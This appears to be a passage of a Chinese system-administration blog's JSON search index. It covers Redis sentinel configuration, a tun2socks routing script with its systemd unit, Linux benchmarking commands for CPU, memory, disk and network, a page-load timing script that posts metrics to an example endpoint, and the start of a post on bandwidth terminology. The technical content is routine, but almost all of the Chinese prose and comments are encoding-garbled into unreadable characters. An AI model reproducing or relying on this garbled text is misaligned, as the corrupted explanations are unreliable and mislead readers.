è¿™é‡Œè®¾ç½®ä¸ºé»˜è®¤çš„1 sentinel parallel-syncs mymaster 1 # 200 ## æ•…éšœè½¬ç§»çš„è¶…æ—¶æ—¶é—´æ¯«ç§’, é»˜è®¤: 180000æ¯«ç§’ sentinel failover-timeout mymaster 180000 # 225 1.2 åˆ›å»º systemd ç®¡ç†å•å…ƒ [Unit] Description=Redis Sentinel(%i) After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/opt/redis-server/6.2.14/bin/redis-server /opt/redis-server/6.2.14/etc/sentinel_%i.conf --sentinel ExecStop=/usr/bin/redis-cli -p %i sentinel shutdown Type=simple User=redis Group=redis RuntimeDirectory=redis RuntimeDirectoryMode=0755 LimitNOFILE=10240 [Install] WantedBy=multi-user.target 1.3 å…¶ä»– é…ç½®å®Œæˆåæä¾›ç»™ç”¨æˆ·çš„æ˜¯ sentinel çš„ç«¯å£, è€Œä¸æ˜¯ redis çš„ç«¯å£ sentinel åœ¨å¯åŠ¨åï¼Œä¼šå°†å“¨å…µé›†ç¾¤çš„å…ƒæ•°æ®ä¿¡æ¯å†™å…¥æ‰€æœ‰sentinelçš„é…ç½®æ–‡ä»¶é‡Œå» ä¸»ä»åˆ‡æ¢åï¼Œsentinel ä¼šè‡ªåŠ¨æ›´æ–°é…ç½®æ–‡ä»¶ï¼Œå°†æ–°ä¸»æœºçš„ä¿¡æ¯å†™å…¥åˆ°sentinelçš„é…ç½®æ–‡ä»¶ä¸­, å¹¶ä¸”ä¸»åŠ¨æ›´æ–° redis é…ç½®æ–‡ä»¶ ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","åŒæ­¥"],"title":"Redisä¸»ä»å¤åˆ¶+å“¨å…µ","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","windows","è¿ç»´è®°äº‹"],"content":"Linuxä¸‹ä½¿ç”¨tun2socksè¿›è¡Œä¸¤åœ°ç½‘ç»œè¿æ¥","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","tags":["linux","windows","ä¼˜åŒ–","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxä¸‹ä½¿ç”¨tun2socksè¿›è¡Œä¸¤åœ°ç½‘ç»œè¿æ¥","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","è¿ç»´è®°äº‹"],"content":" ä¹‹å‰å†™äº†ä¸€ä¸ªå…³äºå†…ç½‘å›æ‹¨è§£å†³æ–¹æ¡ˆ, ä¸»è¦æ˜¯ä»‹ç»åœ¨PPTPä¸å¥½ç”¨çš„æƒ…å†µä¸‹ï¼Œä¸¤åœ°æœºæˆ¿ç½‘ç»œå¦‚ä½•è¿›è¡Œå†…ç½‘è¿æ¥ï¼Œè¯¥ç¯‡æ¨èä½¿ç”¨çš„æ˜¯badvpn, ä½†è¯¥ä»“åº“å·²ç»å½’æ¡£å¾ˆä¹…äº†ã€‚è¿™ç¯‡ä»‹ç»å¦ä¸€ä¸ªå·¥å…· tun2socks æ¥æ›¿ä»£badvpnã€‚ å…³äºä¸ºä»€ä¹ˆè®°å½•è¿™ä¸ªï¼Œå¯ä»¥ç¿»çœ‹ä¹‹å‰çš„æ–‡ç« å†…ç½‘å›æ‹¨è§£å†³æ–¹æ¡ˆ, æœ¬ç¯‡åªè®°å½•ç›¸å…³çš„æ•´åˆè„šæœ¬ã€‚ tun2socks å®‰è£… åœ¨ https://github.com/xjasonlyu/tun2socks/releases ä¸­æ‰¾åˆ°é€‚åˆè‡ªå·±ç³»ç»Ÿçš„äºŒè¿›åˆ¶ç¨‹åºï¼Œä¸‹è½½åè§£å‹åˆ°/usr/local/binä¸‹å³å¯ã€‚ tun2socks-control ç”¨äºç®¡ç†è·¯ç”±çš„æ·»åŠ å’Œåˆ é™¤ /usr/local/bin/tun2socks-control #!/usr/bin/bash ################################################# # author 0x5c0f # date 2023-04-27 # email mail@0x5c0f.cc # web tools.0x5c0f.cc # version 1.2.0 # last update 2024-06-11 # descript Use : ./tun2socks-control -h ################################################# PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # Log level [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"${LOG_LEVEL:-info}\" # proxy model PROXY_MODEL=\"${PROXY_MODEL}\" # local dev LOCAL_NETWORK_DEV=\"${LOCAL_NETWORK_DEV:-eth0}\" # tun dev TUN_NETWORK_DEV=\"${TUN_NETWORK_DEV:-tun1}\" # tun ip prefix TUN_NETWORK_PREFIX=\"${TUN_NETWORK_PREFIX:-10.3.6}\" # route ip TUN_ROUTE_IP=($(eval echo ${SOCKS_ROUTE})) _START() { ip tuntap add dev \"${TUN_NETWORK_DEV}\" mode tun ip addr add \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip link set \"${TUN_NETWORK_DEV}\" up # add route for _ip in ${TUN_ROUTE_IP[@]}; do ip route add \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # start tun2socks (https://github.com/xjasonlyu/tun2socks.git) tun2socks -device ${TUN_NETWORK_DEV} -proxy ${PROXY_MODEL} -interface ${LOCAL_NETWORK_DEV} -loglevel ${LOG_LEVEL} } _STOP() { # delete route for _ip in ${TUN_ROUTE_IP[@]}; do ip route del \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # delete network dev ip link set \"${TUN_NETWORK_DEV}\" down ip addr del \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip tuntap del dev \"${TUN_NETWORK_DEV}\" mode tun } main() { case \"$1\" in \"start\") _START ;; \"stop\") _STOP ;; *) echo \"$0 start|stop\" ;; esac } main $@ tun2socks ç”¨äºé…ç½®éœ€è¦ç»‘å®šçš„è·¯ç”±å’Œsocksä¿¡æ¯ /etc/sysconfig/tun2socks ## tun2socks æ—¥å¿—çº§åˆ« [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"info\" ## https://github.com/xjasonlyu/tun2socks/wiki/Proxy-Models # \u003cæ­¤é¡¹å¿…å¡«\u003e PROXY_MODEL=\"socks5://127.0.0.1:1083\" ## æœ¬åœ°ç½‘ç»œè®¾å¤‡æ¥å£ (default: eth0) LOCAL_NETWORK_DEV=\"eth0\" # tun è®¾å¤‡å(default: tun1) TUN_NETWORK_DEV=\"tun3\" # tun ç»‘å®šçš„ç½‘æ®µ (default: 10.3.6.0/24) TUN_NETWORK_PREFIX=\"10.3.6\" # åªæ”¯æŒipv4 ROUTE_HOST=\"\" # æ”¯æŒé…ç½®å¤šä¸ª ç©ºæ ¼éš”å¼€ SOCKS_ROUTE=\"${ROUTE_HOST}\" # SOCKS_ROUTE=\"${IPSB_HOST} ${DOCKER_HOST} $(curl -s https://api.github.com/meta | jq -r '[.web[] | select(contains(\\\":\\\") | not)] | join(\\\" \\\")')\" ç”¨äºç®¡ç† tun2socks æœåŠ¡çš„ systemd /etc/systemd/system/tun2socks.service [Unit] Description=tun2socks https://github.com/xjasonlyu/tun2socks.git After=network.target # Requires=socketssh-tun.service [Service] Type=simple EnvironmentFile=/etc/sysconfig/tun2socks PIDFile=/run/tun2socks.pid ExecStart=/usr/local/bin/tun2socks-control start ExecStopPost=/usr/local/bin/tun2socks-control stop [Install] WantedBy=multi-user.target åŠ è½½å¯åŠ¨ $\u003e sudo systemctl daemon-reload $\u003e sudo systemctl start tun2socks.service å…¶ä»–ä¿¡æ¯ windows ç†è®ºå¯ç”¨ï¼Œå¯å‚è€ƒè„šæœ¬è¿›è¡Œè°ƒæ•´ å…¶ä»–ä¿¡æ¯å‚è€ƒ å†…ç½‘å›æ‹¨è§£å†³æ–¹æ¡ˆ ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:0:0","tags":["linux","windows","ä¼˜åŒ–","è§£å†³æ–¹æ¡ˆ"],"title":"Linuxä¸‹ä½¿ç”¨tun2socksè¿›è¡Œä¸¤åœ°ç½‘ç»œè¿æ¥","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Linux æ€§èƒ½åŸºå‡†æµ‹è¯•å·¥å…·åŠæµ‹è¯•æ–¹æ³•","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/","tags":["linux","ä¼˜åŒ–","è§£å†³æ–¹æ¡ˆ"],"title":"Linux æ€§èƒ½åŸºå‡†æµ‹è¯•å·¥å…·åŠæµ‹è¯•æ–¹æ³•","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" graph TB A[Linux æ€§èƒ½åŸºå‡†/æµ‹è¯•] --\u003e B[CPU] A --\u003e C[å†…å­˜] A --\u003e D[ç£ç›˜ IO] A --\u003e E[æ–‡ä»¶ IO] A --\u003e F[ç½‘ç»œ] A --\u003e G[åº”ç”¨ç¨‹åº] B --\u003e H[Super_Pi æµ‹è¯•å•çº¿ç¨‹æ€§èƒ½] B --\u003e I[sysbench æµ‹è¯•å¤šçº¿ç¨‹æ€§èƒ½] C --\u003e J[stream æµ‹è¯•å†…å­˜å¸¦å®½] D --\u003e K[fio æµ‹è¯•IOPS] D --\u003e L[fio æµ‹è¯•ååé‡] E --\u003e M[fio æµ‹è¯•IOPS] E --\u003e N[fio æµ‹è¯•ååé‡] F --\u003e O[netperf æµ‹è¯•å¸¦å®½] F --\u003e P[netperf æµ‹è¯•PPS] G --\u003e Q[wrk æµ‹è¯• Nginx QPS] graph TB A[Linux æ€§èƒ½åŸºå‡†/æµ‹è¯•] --\u003e B[CPU] A --\u003e C[å†…å­˜] A --\u003e D[ç£ç›˜ IO] A --\u003e E[æ–‡ä»¶ IO] A --\u003e F[ç½‘ç»œ] A --\u003e G[åº”ç”¨ç¨‹åº] B --\u003e H[Super_Pi æµ‹è¯•å•çº¿ç¨‹æ€§èƒ½] B --\u003e I[sysbench æµ‹è¯•å¤šçº¿ç¨‹æ€§èƒ½] C --\u003e J[stream æµ‹è¯•å†…å­˜å¸¦å®½] D --\u003e K[fio æµ‹è¯•IOPS] D --\u003e L[fio æµ‹è¯•ååé‡] E --\u003e M[fio æµ‹è¯•IOPS] E --\u003e N[fio æµ‹è¯•ååé‡] F --\u003e O[netperf æµ‹è¯•å¸¦å®½] F --\u003e P[netperf æµ‹è¯•PPS] G --\u003e Q[wrk æµ‹è¯• Nginx QPS] graph TB A[Linux æ€§èƒ½åŸºå‡†/æµ‹è¯•] --\u003e B[CPU] A --\u003e C[å†…å­˜] A --\u003e D[ç£ç›˜ IO] A --\u003e E[æ–‡ä»¶ IO] A --\u003e F[ç½‘ç»œ] A --\u003e G[åº”ç”¨ç¨‹åº] B --\u003e H[Super_Pi æµ‹è¯•å•çº¿ç¨‹æ€§èƒ½] B --\u003e I[sysbench æµ‹è¯•å¤šçº¿ç¨‹æ€§èƒ½] C --\u003e J[stream æµ‹è¯•å†…å­˜å¸¦å®½] D --\u003e K[fio æµ‹è¯•IOPS] D --\u003e L[fio æµ‹è¯•ååé‡] E --\u003e M[fio æµ‹è¯•IOPS] E --\u003e N[fio æµ‹è¯•ååé‡] F --\u003e O[netperf æµ‹è¯•å¸¦å®½] F --\u003e P[netperf æµ‹è¯•PPS] G --\u003e Q[wrk æµ‹è¯• Nginx QPS] graph TB A[Linux æ€§èƒ½åŸºå‡†/æµ‹è¯•] --\u003e B[CPU] A --\u003e C[å†…å­˜] A --\u003e D[ç£ç›˜ IO] A --\u003e E[æ–‡ä»¶ IO] A --\u003e F[ç½‘ç»œ] A --\u003e G[åº”ç”¨ç¨‹åº] B --\u003e H[Super_Pi æµ‹è¯•å•çº¿ç¨‹æ€§èƒ½] B --\u003e I[sysbench æµ‹è¯•å¤šçº¿ç¨‹æ€§èƒ½] C --\u003e J[stream æµ‹è¯•å†…å­˜å¸¦å®½] D --\u003e K[fio æµ‹è¯•IOPS] D --\u003e L[fio æµ‹è¯•ååé‡] E --\u003e M[fio æµ‹è¯•IOPS] E --\u003e N[fio æµ‹è¯•ååé‡] F --\u003e O[netperf æµ‹è¯•å¸¦å®½] F --\u003e P[netperf æµ‹è¯•PPS] G --\u003e Q[wrk æµ‹è¯• Nginx QPS] CPU Super_Pi Super_Pi æ˜¯ä¸€ç§ç”¨äºè®¡ç®—åœ†å‘¨ç‡Ï€çš„ç¨‹åºï¼Œé€šå¸¸ç”¨äºæµ‹è¯•è®¡ç®—æœºæ€§èƒ½å’Œç¨³å®šæ€§ã€‚å®ƒçš„ä¸»è¦ç”¨é€”æ˜¯æµ‹é‡ç³»ç»Ÿçš„å•çº¿ç¨‹æ€§èƒ½ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå•çº¿ç¨‹åº”ç”¨ç¨‹åºã€‚ # å®‰è£… bc $\u003e yum -y install bc # æµ‹è¯• , æ ¹æ®è¿è¡Œç»“æœã€‚æŸ¥çœ‹ real è¡Œï¼Œæ—¶é—´è¶ŠçŸ­ï¼Œæ€§èƒ½è¶Šå¥½ $\u003e time echo \"scale=5000; 4*a(1)\" | bc -l -q \u0026\u003e1 sysbench ç´ æ•°è®¡ç®— # å®‰è£… sysbench $\u003e yum -y install sysbench # æµ‹è¯•æ–¹æ³•: å¯åŠ¨4ä¸ªçº¿ç¨‹è®¡ç®—10000äº‹ä»¶æ‰€èŠ±çš„æ—¶é—´ ## ç»“æœåˆ†æï¼Œçœ‹ total time å³å¯ï¼Œæ—¶é—´è¶ŠçŸ­ï¼Œæ€§èƒ½è¶Šå¥½ $\u003e sysbench cpu --threads=4 --events=10000 --time=0 run å†…å­˜ å†…å­˜å¸¦å®½(stream) Streamæµ‹è¯•æ˜¯å†…å­˜æµ‹è¯•ä¸­ä¸šç•Œå…¬è®¤çš„å†…å­˜å¸¦å®½æ€§èƒ½æµ‹è¯•åŸºå‡†å·¥å…· # ç¼–è¯‘å®‰è£… STREAM $\u003e yum -y install gcc gcc-gfortran $\u003e git clone https://github.com/jeffhammond/STREAM.git $\u003e cd STREAM/ $\u003e make # æŒ‡å®šçº¿ç¨‹æ•° $\u003e export OMP_NUM_THREADS=1 # ç»“æœåˆ†æï¼Œçœ‹ Copyã€Scaleã€Addã€Triadï¼Œæ•°å€¼è¶Šå¤§ï¼Œæ€§èƒ½è¶Šå¥½ $\u003e ./stream_c.exe ç£ç›˜ IO/æ–‡ä»¶ IO ç£ç›˜ IO å’Œ æ–‡ä»¶ IOçš„æµ‹è¯•æ–¹æ³•ä¸€è‡´ï¼Œå°†å¯¹åº”çš„ --filename å€¼ä¿®æ”¹ä¸ºå…·ä½“çš„ç£ç›˜å³å¯ï¼Œå¦‚ /dev/sda(æ³¨:ç£ç›˜IOæµ‹è¯•æ—¶ï¼Œè¯·ç”¨ç©ºç›˜æµ‹è¯•) ç£ç›˜/æ–‡ä»¶è¯»ã€å†™iops iopsï¼šç£ç›˜çš„æ¯ç§’è¯»å†™æ¬¡æ•°ï¼Œè¿™ä¸ªæ˜¯éšæœºè¯»å†™è€ƒå¯Ÿçš„é‡ç‚¹ # å®‰è£… $\u003e yum -y install fio # æµ‹è¯•éšæœºè¯» IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randread --filename=/home/randread.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # æµ‹è¯•éšæœºå†™ IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randwrite --filename=/home/randwrite.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # ç»“æœåˆ†æï¼Œçœ‹ IOPS å³å¯ï¼Œå€¼è¶Šå¤§ï¼Œæ€§èƒ½è¶Šå¥½ å› åœ°åˆ¶å®œï¼Œçµæ´»é€‰å–ã€‚åœ¨åŸºå‡†æµ‹è¯•æ—¶ï¼Œä¸€å®šè¦æ³¨æ„æ ¹æ®åº”ç”¨ç¨‹åº I/O çš„ç‰¹ç‚¹ï¼Œæ¥å…·ä½“è¯„ä¼°æŒ‡æ ‡ æ¯”å¦‚ etcd ç£ç›˜æ€§èƒ½è¡¡é‡æŒ‡æ ‡ä¸ºï¼šWAL æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨ fsync çš„å»¶è¿Ÿåˆ†å¸ƒï¼Œå½“ 99% æ ·æœ¬çš„åŒæ­¥æ—¶é—´å°äº 10 æ¯«ç§’å°±å¯ä»¥è®¤ä¸ºå­˜å‚¨æ€§èƒ½èƒ½å¤Ÿæ»¡è¶³ etcd çš„æ€§èƒ½è¦æ±‚ã€‚ $\u003e mkdir etcd-bench $\u003e fio --rw=write --ioengine=sync --fdatasync=1 --directory=etcd-bench --size=22m --bs=2300 --name=etcd-bench ç½‘ç»œ ä¼ è¾“é€Ÿç‡(pps) # server \u0026 client ç¼–è¯‘å®‰è£… netserver $\u003e wget -c \"https://codeload.github.com/HewlettPackard/netperf/tar.gz/netperf-2.5.0\" -O netperf-2.5.0.tar.gz $\u003e yum -y install gcc cc $\u003e tar zxvf netperf-2.5.0.tar.gz $\u003e cd netperf-netperf-2.5.0 $\u003e ./configure \u0026\u0026 make \u0026\u0026 make install # server ç«¯å¯åŠ¨ netserver $\u003e netserver # ç›‘æ§æ•°æ® $\u003e sar -n DEV 5 # client ç«¯æµ‹è¯• $\u003e netperf -t UDP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 64 -R 1 \u0026 # ç›‘æ§æ•°æ® $\u003e sar -n DEV 5 # ç»“æœåˆ†æï¼Œçœ‹ rxpck/s,txpck/s å€¼å³å¯ï¼Œå€¼è¶Šå¤§ï¼Œæ€§èƒ½è¶Šå¥½ ç½‘ç»œå¸¦å®½ å®½å¸¦æµ‹é€Ÿè¿˜æœ‰ä¸ªå·¥å…·-iperf3 https://iperf.fr/iperf-download.php # server ç«¯å¯åŠ¨ netserver $\u003e netserver # ç›‘æ§æ•°æ® $\u003e sar -n DEV 5 # client ç«¯æµ‹è¯• $\u003e netperf -t TCP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 1500 -R 1 \u0026 # ç›‘æ§æ•°æ® $\u003e sar -n DEV 5 # ç»“æœåˆ†æï¼Œçœ‹ rxkB/s,txkB/s å€¼å³å¯ï¼Œå€¼è¶Šå¤§ï¼Œæ€§èƒ½è¶Šå¥½ å•å‘æ—¶å»¶ # æœåŠ¡ç«¯ï¼š yum install -y sockperf sockperf sr --daemonize \u003e /dev/null 2\u003e\u00261 # å®¢æˆ·ç«¯ï¼š sockperf under-load -i serverip --mps=100000 -t 300 -m 14 --reply-every=50 --full-log=sockperf.out # mps: æ¯ç§’å¤šå°‘è¯·æ±‚ -t æµ‹è¯•æ—¶é—´ -m æ¯ä¸ªè¯·æ±‚å¤§å°(é»˜è®¤14byte) Nginx # å®‰è£… ab å·¥å…· $\u003e yum -y install httpd-tools # ç¼–è¯‘å®‰è£… wrk $\u003e git clone https://github.com/wg/wrk.git $\u003e make $\u003e cp wrk /usr/local/bin/ # æµ‹è¯•ï¼Œ-cè¡¨ç¤ºå¹¶å‘è¿æ¥æ•°1000ï¼Œ-tè¡¨ç¤ºçº¿ç¨‹æ•°ä¸º2ï¼Œ-d è¡¨ç¤ºæµ‹è¯•æ—¶é—´ ## # ç»“æœåˆ†æï¼ŒRequests/sec ä¸º QPS $\u003e wrk -t12 -c400 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:0:0","tags":["linux","ä¼˜åŒ–","è§£å†³æ–¹æ¡ˆ"],"title":"Linux æ€§èƒ½åŸºå‡†æµ‹è¯•å·¥å…·åŠæµ‹è¯•æ–¹æ³•","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","è§£å†³æ–¹æ¡ˆ"],"content":"å¯ç”¨æ¥ç»Ÿè®¡é¡µé¢åŠ è½½æ—¶é—´ï¼Œjsç»„ä»¶ç›´æ¥æ’å…¥åˆ°htmlæœ«å°¾å³å¯","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/","tags":["linux","javascript","scripts"],"title":"é¡µé¢åŠ è½½æ—¶é—´ç»Ÿè®¡","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","è§£å†³æ–¹æ¡ˆ"],"content":"js ç»„ä»¶ ç›´æ¥ä¿å­˜ä¸ºæ–‡ä»¶, æ’å…¥åˆ° html æœ«å°¾å³å¯, ç”¨æ¥ç»Ÿè®¡å½“å‰é¡µé¢çš„å„ç±»åŠ è½½æ—¶é—´ç„¶åæ¨é€åˆ°è¿œç«¯(å½“ç„¶ï¼Œåç«¯éœ€è¦è‡ªå·±æ„å»ºæ¥å£) \u003cscript id=\"tracking-script\" src=\"./pcheck.js\" data-tracking-code=\"{{ TRACKING_CODE }}\"\u003e\u003c/script\u003e // é‡‡é›†ä¿¡æ¯æ¨é€ç›®æ ‡ const apiUrl = \"//example.com/rz/api/v1/performance/webpage/data/\"; // æ—¥å¿—æ‰“å°æ§åˆ¶å˜é‡, ç”±åç«¯æœåŠ¡æ§åˆ¶ let enableLog = true; // è·å–è·Ÿè¸ªä»£ç  function getTrackingCode() { try { const currentScript = document.getElementById(\"performance-check-script\"); return currentScript.getAttribute(\"data-tracking-code\"); } catch (error) { console.error(error); console.log('è¯·åœ¨å¼•å…¥è¯¥è„šæœ¬çš„scriptæ ‡ç­¾ä¸Šæ·»åŠ id=\"performance-check-script\"å±æ€§'); return null; } } // é‡‡é›†æ•°æ®æ¨é€ async function sendPerformanceData(data) { if (!data.tracking_code) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } if (enableLog) console.log(\"Sending performance data:\", data); const postOptions = { method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify(data) }; try { const response = await fetch(apiUrl, postOptions); if (response.ok) { const result = await response.json(); if (enableLog) console.log(\"Performance data sent successfully:\", result); } else { if (enableLog) console.error(`Request failed with status: ${response.status}`); } } catch (error) { if (enableLog) console.error(\"Error sending performance data:\", error); } } // æ”¶é›†æ€§èƒ½æ•°æ®çš„ä¸»å‡½æ•° async function collectPerformanceData() { const trackingCode = getTrackingCode(); if (!trackingCode) { if (enableLog) console.log(\"No tracking code provided. Skipping performance data collection.\"); return; } let performanceData; if (window.PerformanceNavigationTiming) { const entry = performance.getEntriesByType(\"navigation\")[0]; performanceData = extractPerformanceDataFromNavigationEntry(entry); } else { performanceData = extractPerformanceDataFromTimingAPI(); } performanceData.tracking_code = trackingCode; performanceData.request_uri = window.location.pathname; performanceData.tracking_domain = window.location.hostname; await sendPerformanceData(performanceData); } function extractPerformanceDataFromNavigationEntry(entry) { return { frontend_performance: entry.duration, dns_time: entry.domainLookupEnd - entry.domainLookupStart, redirect_time: entry.redirectEnd - entry.redirectStart, dom_load_time: entry.domContentLoadedEventEnd - entry.domContentLoadedEventStart, ttfb_time: entry.responseStart - entry.requestStart, content_load_time: entry.loadEventStart - entry.responseEnd, onload_callback_time: entry.loadEventEnd - entry.loadEventStart, dns_cache_time: entry.domainLookupStart, unload_time: entry.unloadEventEnd - entry.unloadEventStart, tcp_handshake_time: entry.connectEnd - entry.connectStart }; } function extractPerformanceDataFromTimingAPI() { const timing = performance.timing; return { frontend_performance: timing.loadEventEnd - timing.navigationStart, dns_time: timing.domainLookupEnd - timing.domainLookupStart, redirect_time: timing.redirectEnd - timing.redirectStart, dom_load_time: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart, ttfb_time: timing.responseStart - timing.requestStart, content_load_time: timing.loadEventStart - timing.responseEnd, onload_callback_time: timing.loadEventEnd - timing.loadEventStart, dns_cache_time: timing.domainLookupStart, unload_time: timing.unloadEventEnd - timing.unloadEventStart, tcp_handshake_time: timing.connectEnd - timing.connectStart }; } // å½“è„šæœ¬åŠ è½½å®Œæˆåç«‹å³æ‰§è¡Œ (function () { if (document.readyState === \"complete\") { setTimeout(collectPerformanceData, 0); } else { window.addEventListener(\"load\", function () { setTimeout(collectPerformanceData, 0); }); } })(); // æä¾›ä¸€ä¸ªæ–¹æ³•æ¥æ§åˆ¶æ—¥å¿—æ‰“å° function setLogEnabled(enabled) { enableLog = enabled; } ","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/:0:0","tags":["linux","javascript","scripts"],"title":"é¡µé¢åŠ è½½æ—¶é—´ç»Ÿè®¡","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"å†…ç½‘.å¤–ç½‘.å®½å¸¦.å¸¦å®½.æµé‡.ç½‘é€Ÿä¹‹é—´çš„åŒºåˆ«ä¸è”ç³»","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"å†…ç½‘.å¤–ç½‘.å®½å¸¦.å¸¦å®½.æµé‡.ç½‘é€Ÿä¹‹é—´çš„åŒºåˆ«ä¸è”ç³»","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" å¸¦å®½ä¸å®½å¸¦çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ å¸¦å®½æ˜¯é‡è¯ï¼ŒæŒ‡çš„æ˜¯ç½‘é€Ÿçš„å¤§å°ï¼Œæ¯”å¦‚1Mbpsçš„æ„æ€æ˜¯ä¸€å…†æ¯”ç‰¹æ¯ç§’ï¼Œè¿™ä¸ªæ•°å€¼å°±æ˜¯æŒ‡å¸¦å®½ã€‚ å®½å¸¦æ˜¯åè¯ï¼Œè¯´æ˜ç½‘ç»œçš„ä¼ è¾“é€Ÿç‡é€Ÿå¾ˆé«˜ ã€‚å®½å¸¦çš„æ ‡å‡†å„ä¸ç›¸åŒï¼Œæœ€åˆè®¤ä¸º128kbpsä»¥ä¸Šå¸¦å®½çš„å°±æ˜¯å®½å¸¦ï¼Œè€Œä»¥ä¸‹çš„å°±æ˜¯çª„å¸¦ã€‚ ä½†ç°åœ¨å›½å†…è¿è¥å•†ä¸€èˆ¬æä¾›è‡³å°‘512kbpså¸¦å®½çš„å®½å¸¦æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¸¦å®½æ˜¯ä¸€ä¸ªå…·ä½“æ•°å€¼ï¼Œè€Œå®½å¸¦åˆ™æ˜¯æ»¡è¶³ä¸€å®šå¸¦å®½æ•°å€¼çš„ä¸€ç§ä¼ è¾“æ ‡å‡†(æœåŠ¡)ã€‚ å³ï¼šå®½å¸¦æ˜¯ä¸€ç§ä¸šåŠ¡ï¼Œå¸¦å®½æ˜¯ä¼ 